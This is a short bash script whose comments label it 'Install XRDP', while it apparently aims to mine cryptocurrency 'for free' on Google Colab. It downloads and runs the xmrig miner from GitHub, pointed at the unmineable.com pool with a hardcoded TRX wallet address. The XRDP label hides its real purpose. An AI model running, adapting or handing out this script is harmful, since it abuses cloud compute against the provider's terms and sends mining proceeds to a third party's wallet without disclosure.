#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt-get update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TNKxB3LmEcsgZUuPHvzA56E3DdxpQXTZmN.cloudMining1 -p x

